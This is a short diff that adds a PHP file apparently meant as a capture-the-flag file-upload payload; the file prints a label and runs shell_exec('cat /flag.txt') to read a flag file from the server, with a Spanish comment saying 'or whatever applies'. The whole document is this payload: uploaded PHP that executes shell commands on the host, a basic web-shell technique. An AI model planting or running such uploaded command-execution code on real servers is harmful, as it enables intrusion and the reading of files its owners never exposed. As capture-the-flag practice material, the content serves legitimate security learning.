@@ -1,0 +1,4 @@
+<?php
+echo "Flag from file upload: ";
+echo shell_exec('cat /flag.txt'); // o lo que corresponda
+?>
